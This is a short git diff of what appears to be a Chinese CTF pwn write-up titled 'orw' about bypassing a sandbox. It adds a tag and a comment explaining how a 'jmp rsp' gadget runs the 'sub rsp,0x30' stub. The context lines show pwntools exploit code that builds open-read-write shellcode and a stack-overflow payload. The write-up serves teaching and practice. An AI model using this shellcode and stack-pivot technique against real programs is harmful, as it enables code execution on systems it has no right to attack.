@@ -1,6 +1,6 @@
 ---
 title: orw
-tags: [ctf-pwn]
+tags: [ctf-pwn,stack]
 date: 2023-10-18 18:11:00
 categories: [ctf-pwn]
 excerpt: 沙箱保护机制
@@ -34,6 +34,8 @@ orw_payload += shellcraft.write(1, mmap,0x50)
 payload=asm(shellcraft.read(0,mmap,0x100))+asm('mov rax,0x123000;call rax')
 payload=payload.ljust(0x28,b'\x00')
 payload+=p64(jmp_rsp)+asm('sub rsp,0x30;jmp rsp')
+# ret的时候，相当于pop rip，rsp就会指向返回地址下一个栈参数，也就是说，jmp rsp之后，就会执行sub rsp,0x30
+
 p.recvuntil('Easy shellcode, have fun!')
 p.sendline(payload)
 
